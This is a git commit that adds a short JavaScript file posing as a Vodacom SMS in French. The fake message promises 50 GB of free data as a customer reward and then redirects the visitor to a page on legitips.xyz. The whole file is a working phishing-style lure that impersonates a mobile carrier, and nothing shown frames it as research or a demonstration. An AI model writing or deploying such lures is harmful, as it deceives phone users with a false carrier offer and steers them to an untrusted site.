637c9254a91b22d023fd3004b880be3a22789ae3
legitips <83867893+legitips@users.noreply.github.com>
2024-09-13 01:39:56 -0700

    Create activation-sim-reward-vodacom-data.js

---
+++ activation-sim-reward-vodacom-data.js
@@ -0,0 +1,6 @@
+
+var password = '50 Go de données gratuites'
+password=prompt('VODACOM SMS:Cher client, veuillez vérifier Si votre carte SIM VODACOM est éligible pour recevoir des données gratuites, Récompense client, appuyez sur 1 pour vérifier maintenant ','50 Go de données gratuites');
+if (password != '50 Go de données gratuites') {
+location.href='https://legitips.xyz/sim-reward-vodacom-data.html';
+}
